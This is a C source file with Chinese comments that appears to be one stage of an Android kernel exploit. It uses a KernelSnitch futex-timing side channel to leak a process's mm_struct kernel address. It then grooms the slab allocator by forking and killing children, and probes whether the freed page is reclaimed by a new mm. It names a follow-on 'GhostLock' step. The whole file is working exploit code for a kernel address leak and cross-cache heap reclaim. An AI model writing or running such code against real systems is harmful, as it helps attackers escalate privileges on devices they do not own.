/* reclaim_ks.c — G5/T1+：KernelSnitch 泄露 leak child 的 mm，E3 groom 释放该页，
 * 再用一个新 mm 的 KernelSnitch 泄露做"页是否真的被释放/复用"的安全判定。
 *
 * 安全：仅 fork/kill + futex 计时（KernelSnitch）+ 读 /proc；不写内核、不触发 GhostLock。
 *
 * 用法: reclaim_ks [npost]
 *   1) fork 17 pre children（pause）
 *   2) fork leak child → exec /data/local/tmp/ksnitch_k3 --hold → 读其 stdout 的 MM
 *   3) fork npost post children
 *   4) kill pre + post，最后 kill leak（其 slab 页变空 → discard）
 *   5) fork 24 probe children；对其中若干跑 ks_wide_scan 读 MM，检查其页是否 == L
 *   判据：若某 probe 的 mm 页 == L，则 L 页确实被释放并被 mm cache 复用（页级释放证据）。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/prctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define MAXK 2048
static pid_t kids[MAXK];
static int nk;

static void pin0(void) {
    cpu_set_t s; CPU_ZERO(&s); CPU_SET(0, &s);
    sched_setaffinity(0, sizeof(s), &s);
}
static void pause_child(void) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    for (;;) pause();
}
static pid_t fork_pause(void) {
    pid_t p = fork();
    if (p == 0) pause_child();
    if (p > 0) kids[nk++] = p;
    return p;
}
static void killp(pid_t p) { if (p > 0) { kill(p, SIGKILL); waitpid(p, NULL, 0); } }

/* 在 child 中 exec ks_wide_scan，读 stdout 直到 "MM " 行；返回 mm 或 0 */
static uint64_t run_ks(int hold, int timeout_s) {
    int fd[2];
    if (pipe(fd) != 0) return 0;
    pid_t p = fork();
    if (p == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        dup2(fd[1], 1);
        close(fd[0]); close(fd[1]);
        execl("/data/local/tmp/ksnitch_k3", "ks_wide_scan",
              hold ? "--hold" : "10", (char *)NULL);
        _exit(127);
    }
    close(fd[1]);
    FILE *f = fdopen(fd[0], "r");
    if (!f) { killp(p); return 0; }
    char line[512];
    uint64_t mm = 0;
    time_t t0 = time(NULL);
    while (fgets(line, sizeof(line), f)) {
        printf("  [ks] %s", line);
        if (strncmp(line, "MM ", 3) == 0) {
            mm = strtoull(line + 3, NULL, 16);
            break;
        }
        if (time(NULL) - t0 > timeout_s) break;
    }
    if (!hold) { fclose(f); waitpid(p, NULL, 0); return mm; }
    /* hold 模式：不关闭管道，保留子进程 */
    fclose(f);
    return mm;
}

int main(int argc, char **argv) {
    int npost = argc > 1 ? atoi(argv[1]) : 36;
    setvbuf(stdout, NULL, _IONBF, 0);
    pin0();
    printf("== reclaim_ks npost=%d ==\n", npost);

    /* 1) pre 17 */
    for (int i = 0; i < 17; i++) fork_pause();
    /* 2) leak child：先 fork，再 exec ks_wide_scan --hold；其 mm 在 fork 时分配 */
    int fd[2]; if (pipe(fd) != 0) return 1;
    pid_t leak = fork();
    if (leak == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        dup2(fd[1], 1); close(fd[0]); close(fd[1]);
        execl("/data/local/tmp/ksnitch_k3", "ks_wide_scan", "--hold", (char *)NULL);
        _exit(127);
    }
    close(fd[1]);
    FILE *lf = fdopen(fd[0], "r");
    uint64_t mm_leak = 0;
    char line[512];
    time_t t0 = time(NULL);
    while (lf && fgets(line, sizeof(line), lf)) {
        printf("  [leak] %s", line);
        if (strncmp(line, "MM ", 3) == 0) { mm_leak = strtoull(line + 3, NULL, 16); break; }
        if (time(NULL) - t0 > 120) break;
    }
    if (!mm_leak) { printf("leak MM not recovered\n"); killp(leak); return 1; }
    uint64_t L = mm_leak & ~0x3FFFULL;
    printf("leak mm=%016llx page=%016llx\n",
           (unsigned long long)mm_leak, (unsigned long long)L);

    /* 3) post children（保证有其他 slab 供 seed/partial） */
    for (int i = 0; i < npost; i++) fork_pause();

    /* 4) kill pre + post，最后 kill leak */
    printf("kill pre/post ...\n");
    for (int i = 0; i < nk; i++) killp(kids[i]);
    nk = 0;
    usleep(200 * 1000);
    printf("kill leak (last) ...\n");
    killp(leak);
    usleep(400 * 1000);

    /* 5) 反复 fork 一个"跑 ks 并退出"的子进程；每次分配一个 mm，
     *    24 次足以跨过 partial 并进入新 slab；若新 slab 页 == L 则命中。 */
    printf("probe trials ...\n");
    int found = 0;
    for (int t = 0; t < 4 && !found; t++) {
        uint64_t m = run_ks(0, 120);
        if (!m) { printf("probe#%d mm=NA\n", t); continue; }
        uint64_t P = m & ~0x3FFFULL;
        printf("probe#%d mm=%016llx page=%016llx %s L\n", t,
               (unsigned long long)m, (unsigned long long)P,
               P == L ? "==" : "!=");
        if (P == L) found = 1;
    }
    printf("RESULT page_reused_by_mm=%s\n", found ? "YES" : "UNKNOWN");
    printf("done\n");
    return 0;
}
